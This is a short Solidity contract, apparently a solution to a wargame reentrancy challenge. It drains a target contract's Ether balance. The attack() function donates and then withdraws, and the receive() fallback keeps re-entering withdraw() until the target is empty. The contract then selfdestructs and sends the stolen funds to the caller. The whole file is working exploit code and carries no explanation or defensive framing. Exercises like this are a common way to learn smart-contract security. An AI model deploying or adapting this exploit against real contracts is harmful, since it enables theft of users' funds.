// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract HackEntrance {
    IReentrancy private immutable target;

    constructor(address payable _target) {
        target = IReentrancy(_target);
    }

    receive() external payable { 
        uint amount = min(1e15, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }        
    }

    function attack() external payable {
        target.donate{value:1e15}(address(this));
        target.withdraw(1e15);

        require(address(target).balance == 0, "Target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}
